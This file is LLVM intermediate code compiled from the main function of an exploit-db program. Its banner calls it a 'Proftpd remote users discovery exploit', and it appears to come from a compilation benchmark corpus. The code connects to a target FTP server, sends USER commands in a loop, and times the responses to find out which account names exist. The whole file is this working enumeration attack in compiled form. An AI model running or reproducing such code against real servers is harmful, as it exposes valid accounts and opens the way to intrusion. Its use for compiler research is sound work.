; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_581.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_581.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.timeval = type { i64 }
%struct.timezone = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [110 x i8] c"Proftpd remote users discovery exploit\0A Coded by Leon / LSS Security\0A>-------------------------------------<\0A\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"usage: %s \00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@PORT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [13 x i8] c"Login time: \00", align 1
@PROBE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [10 x i8] c"USER %s\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c" %d |\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"\0AAvrg: %d\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca [1024 x i8], align 16
  %13 = alloca [1024 x i8], align 16
  %14 = alloca %struct.timeval, align 8
  %15 = alloca %struct.timeval, align 8
  %16 = alloca %struct.timezone, align 4
  %17 = alloca %struct.timezone, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64 0, i64* %10, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str, i64 0, i64 0))
  %19 = load i32, i32* %4, align 4
  %20 = icmp ne i32 %19, 3
  br i1 %20, label %21, label %27

21:                                               ; preds = %2
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i8* %24)
  %26 = call i32 @exit(i32 0) #3
  unreachable

27:                                               ; preds = %2
  %28 = load i32, i32* @AF_INET, align 4
  %29 = load i32, i32* @SOCK_STREAM, align 4
  %30 = call i32 @socket(i32 %28, i32 %29, i32 0)
  store i32 %30, i32* %6, align 4
  %31 = load i32, i32* @AF_INET, align 4
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 3
  store i32 %31, i32* %32, align 4
  %33 = load i32, i32* @PORT, align 4
  %34 = call i32 @htons(i32 %33)
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %34, i32* %35, align 4
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 1
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @inet_addr(i8* %38)
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %41 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %40, i32 0, i32 0
  store i32 %39, i32* %41, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  %44 = call i32 @bzero(i32 %43, i32 8)
  %45 = load i32, i32* %6, align 4
  %46 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %47 = call i32 @connect(i32 %45, %struct.sockaddr* %46, i32 4)
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0))
  %49 = load i32, i32* %6, align 4
  %50 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %51 = call i32 @read(i32 %49, i8* %50, i32 1024)
  store i32 %51, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %52

52:                                               ; preds = %82, %27
  %53 = load i32, i32* %8, align 4
  %54 = load i32, i32* @PROBE, align 4
  %55 = icmp slt i32 %53, %54
  br i1 %55, label %56, label %85

56:                                               ; preds = %52
  %57 = call i32 @gettimeofday(%struct.timeval* %14, %struct.timezone* %16)
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 2
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @snprintf(i8* %58, i32 1023, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0), i8* %61)
  %63 = load i32, i32* %6, align 4
  %64 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %65 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %66 = call i32 @strlen(i8* %65)
  %67 = call i32 @write(i32 %63, i8* %64, i32 %66)
  %68 = load i32, i32* %6, align 4
  %69 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %70 = call i32 @read(i32 %68, i8* %69, i32 1024)
  store i32 %70, i32* %7, align 4
  %71 = call i32 @gettimeofday(%struct.timeval* %15, %struct.timezone* %17)
  %72 = getelementptr inbounds %struct.timeval, %struct.timeval* %15, i32 0, i32 0
  %73 = load i64, i64* %72, align 8
  %74 = getelementptr inbounds %struct.timeval, %struct.timeval* %14, i32 0, i32 0
  %75 = load i64, i64* %74, align 8
  %76 = sub nsw i64 %73, %75
  store i64 %76, i64* %9, align 8
  %77 = load i64, i64* %9, align 8
  %78 = load i64, i64* %10, align 8
  %79 = add nsw i64 %78, %77
  store i64 %79, i64* %10, align 8
  %80 = load i64, i64* %9, align 8
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0), i64 %80)
  br label %82

82:                                               ; preds = %56
  %83 = load i32, i32* %8, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %8, align 4
  br label %52

85:                                               ; preds = %52
  %86 = load i64, i64* %10, align 8
  %87 = load i32, i32* @PROBE, align 4
  %88 = sext i32 %87 to i64
  %89 = sdiv i64 %86, %88
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i64 0, i64 0), i64 %89)
  %91 = load i32, i32* %6, align 4
  %92 = call i32 @close(i32 %91)
  %93 = load i32, i32* %3, align 4
  ret i32 %93
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @bzero(i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @gettimeofday(%struct.timeval*, %struct.timezone*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
